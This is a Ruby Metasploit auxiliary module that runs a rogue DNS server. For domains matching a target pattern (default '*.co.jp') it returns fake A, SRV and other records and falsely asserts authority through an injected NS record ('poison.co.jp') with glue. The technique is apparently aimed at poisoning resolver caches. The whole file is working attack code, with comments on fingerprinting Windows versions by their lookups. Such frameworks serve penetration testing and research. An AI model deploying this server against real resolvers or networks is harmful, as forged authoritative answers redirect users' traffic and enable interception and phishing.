##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'resolv'


class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report


  def initialize
    super(
      'Name'        => 'Fake DNS AA Service',
      'Description'    => %q{
        This module provides a DNS service that assert 
      Fake Authoritative Answer.
        This module is based on the "auxiliary/server/fakedns"
      },
      'Author'      => ['@shutingrz <shu@shutingrz.com>'],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'http://www.e-ontap.com/dns/endofdns-e.html'],
          [ 'URL', 'https://www.rapid7.com/db/modules/auxiliary/server/fakedns']
        ],
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options(
      [
        OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
        OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 53 ]),
        OptString.new('TARGETDOMAIN', [ true, "The list of target domain names we want to assert Authority", '*.co.jp']),
        OptString.new('FAKEHOST', [true, "The hostname of the fake nameserver to assert Authority", 'poison.co.jp']),
        OptAddress.new('FAKEADDR', [ false, "The address of the fake nameserver to assert Authority", nil ]),
        OptInt.new('TTL', [true, 'The TTL for the host entry', rand(20000)+30000])
      ], self.class)

    register_advanced_options(
      [
        OptPort.new('RR_SRV_PORT', [ false, "The port field in the SRV response when FAKE", 5060]),
        OptBool.new('LogConsole', [ false, "Determines whether to log all request to the console", true]),
        OptBool.new('LogDatabase', [ false, "Determines whether to log all request to the database", false]),
      ], self.class)
  end


  def target_host(addr = nil)
    target = datastore['FAKEADDR']
    if target.blank?
      if addr
        ::Rex::Socket.source_address(addr)
      else
        nil
      end
    else
      ::Rex::Socket.resolv_to_dotted(target)
    end
  end

  def run
    @port = datastore['SRVPORT'].to_i
    @fake_nsname = datastore['FAKEHOST']
    @ttl = datastore['TTL'].to_i

    @log_console  = false
    @log_database = false

    if (datastore['LogConsole'].to_s.match(/^(t|y|1)/i))
      @log_console = true
    end

    if (datastore['LogDatabase'].to_s.match(/^(t|y|1)/i))
      @log_database = true
    end

    # MacOS X workaround
    ::Socket.do_not_reverse_lookup = true

    print_status("DNS server initializing")
    @sock = ::UDPSocket.new()
    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    @sock.bind(datastore['SRVHOST'], @port)
    @run = true
    @domain_target_list = datastore['TARGETDOMAIN'].split

    print_status("DNS server started")
    begin

    while @run
      @error_resolving = false
      packet, addr = @sock.recvfrom(65535)
      src_addr = addr[3]
      @requestor = addr
      next if packet.length == 0

      request = Resolv::DNS::Message.decode(packet)
      next unless request.qr == 0

      #To ignore rd request
      next unless request.rd == 0

      #
      # XXX: Track request IDs by requesting IP address and port
      #
      # Windows XP SP1a: UDP source port constant,
      #  sequential IDs since boot time
      # Windows XP SP2: Randomized IDs
      #
      # Debian 3.1: Static source port (32906) until timeout,
      #  randomized IDs
      #

      lst = []

      request.each_question {|name, typeclass|
        # Identify potential domain exceptions
        @match_target = false
        @match_name = name.to_s
        @domain_target_list.each do |ex|
          escaped = Regexp.escape(ex).gsub('\*','.*?')
          regex = Regexp.new "^#{escaped}$", Regexp::IGNORECASE
          if ( name.to_s =~ regex )
            @match_target = true
            @match_name = ex
            @fake_zonename = ex.gsub('*.','')
          end
        end

        tc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, "")

        request.qr = 1
        request.ra = 0

        lst << "#{tc_s} #{name}"
        case tc_s
        when 'IN::A'

          # Special fingerprinting name lookups:
          #
          # _isatap -> XP SP = 0
          # isatap.localdomain -> XP SP >= 1
          # teredo.ipv6.microsoft.com -> XP SP >= 2
          #
          # time.windows.com -> windows ???
          # wpad.localdomain -> windows ???
          #
          # <hostname> SOA -> windows XP self hostname lookup
          #


          if (@match_target)
            # Resolve FAKE response
            ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
            request.add_answer(name, @ttl, ar)
            if (@log_console)
              print_status("DNS target domain #{@match_name} found; Returning fake A records for #{name}")
            end
          else
            # Ignore the exception domain
            if (@log_console)
              print_status("DNS target domain not found; #{name} was ignored")
            end
          end



        when 'IN::MX'
          mx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create("mail.#{name}"))
          request.add_answer(name, @ttl, mx)

        when 'IN::NS'
          ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
          request.add_answer(name, @ttl, ns)

        when 'IN::SRV'
          if @log_console
            print_status("DNS target domain #{@match_name} found; Returning fake SRV records for #{name}")
            # Prepare the FAKE response
            request.add_answer(
              name,
              @ttl,
              Resolv::DNS::Resource::IN::SRV.new(5, 0, datastore['RR_SRV_PORT'], Resolv::DNS::Name.create(name))
            )
          end

        when 'IN::PTR'
          soa = Resolv::DNS::Resource::IN::SOA.new(
            Resolv::DNS::Name.create("ns.internet.com"),
            Resolv::DNS::Name.create("root.internet.com"),
            1,
            3600,
            3600,
            3600,
            3600
          )
          ans = Resolv::DNS::Resource::IN::PTR.new(
            Resolv::DNS::Name.create("www")
          )

          request.add_answer(name, @ttl, ans)
          request.add_authority(name, @ttl, soa)
        else
          lst << "UNKNOWN #{tc_s}"
        end

        #Assert Authority
        if (@match_target)
          ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(@fake_nsname))
          ad = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
          request.add_authority(@fake_zonename, @ttl, ns)
          request.add_additional(Resolv::DNS::Name.create(@fake_nsname), @ttl, ad)
        end
      }


      if(@log_console)
        if(@error_resolving)
          print_error("XID #{request.id} (#{lst.join(", ")}) - Error resolving")
        else
          print_status("XID #{request.id} (#{lst.join(", ")})")
        end
      end

      if(@log_database)
        report_note(
          :host => addr[3],
          :type => "dns_lookup",
          :data => "#{addr[3]}:#{addr[1]} XID #{request.id} (#{lst.join(", ")})"
        ) if lst.length > 0
      end


      @sock.send(request.encode(), 0, addr[3], addr[1])
    end

    rescue ::Exception => e
      print_error("fakedns: #{e.class} #{e} #{e.backtrace}")
    # Make sure the socket gets closed on exit
    ensure
      @sock.close
    end
  end

  def print_error(msg)
    @requestor ? super("%s:%p - DNS - %s" % [@requestor[3], @requestor[1], msg]) : super(msg)
  end

  def print_status(msg)
    @requestor ? super("%s:%p - DNS - %s" % [@requestor[3], @requestor[1], msg]) : super(msg)
  end

end
